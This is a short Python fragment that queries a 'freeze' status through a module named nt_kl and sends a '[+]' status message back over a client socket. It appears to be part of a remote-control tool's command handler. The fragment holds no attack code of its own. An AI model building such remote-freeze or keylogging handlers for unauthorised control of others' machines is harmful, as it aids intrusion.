
status = nt_kl.get_frz_status()
if status:
    resp = '[+] System is currently frozen\n'
else:
    resp = '[+] System is not frozen\n'

send(client_socket,resp)
